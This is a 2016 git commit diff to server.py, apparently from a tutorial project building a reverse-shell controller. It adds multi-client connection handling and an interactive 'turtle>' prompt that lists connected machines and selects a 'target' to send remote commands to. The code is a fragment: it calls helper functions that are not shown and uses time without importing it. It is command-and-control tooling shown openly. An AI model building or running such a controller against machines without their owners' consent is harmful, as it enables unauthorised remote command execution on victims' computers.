b8162b34dae9a8238e273e0c03af71eeae1fbff0
yurchik <15_yurchik@ukr.net>
2016-11-29 12:59:51 +0200

    Add mpart of multithriding and some interactive function

--- server.py
+++ server.py
@@ -1,5 +1,15 @@
 import socket
+import threading
 import sys
+from queue import Queue
+
+
+NUMBER_OF_THREAIDNG = 2
+JOB_NUMBER = [1, 2]
+
+queue = Queue()
+all_connections = []
+all_addresses = []
 
 
 # Create socket (allows two computers to connect)
@@ -26,35 +36,37 @@ def socket_bind():
         s.listen(5)
     except socket.error as msg:
         print("Socket binding error: " + msg + "\n" + "Retrying...")
+        time.sleep(5)
         socket_bind()
 
 
-# Establish the connection to the client
-def socket_accpt():
-    conn, adress = s.accept()
-    print("Connection has been established | IP " + str(adress[0]) + " | Port " + str(adress[1]))
-    send_command(conn)
-    conn.close()
+# Accept connections from multiole clients and save to list
+def accept_connections():
+    for c in all_connections:
+        c.close()
+    del all_connections[:]
+    del all_addresses[:]
+    while 1:
+        try:
+            conn, adrress = s.accept()
+            conn.setblocking(1)
+            all_connections.append(conn)
+            all_addresses.append(adrress)
+            print("\nConnection has been establish: " + str(adrress[0]))
+        except:
+            print("Error accepting connections")
 
 
-# Send command
-def send_command(conn):
+# Interactibe prompt for sending commands remotely
+def start_turtle():
     while True:
-        cmd = input()
-        if cmd == 'quit':
-            conn.close()
-            s.close()
-            sys.exit()
-        if len(str.encode(cmd)) > 0:
-            conn.send(str.encode(cmd))
-            client_response = str(conn.recv(1024), "utf-8")
-            print(client_response, end="")
-
-
-def main():
-    socket_create()
-    socket_bind()
-    socket_accpt()
-
-
-main()
+        cmd = input('turtle> ')
+        if cmd == 'list':
+            list_connections()
+            continue
+        elif 'select' in cmd:
+            conn = get_target(cmd)
+            if conn is not None:
+                send_target_commands(conn)
+        else: 
+            print("Command not recognized")
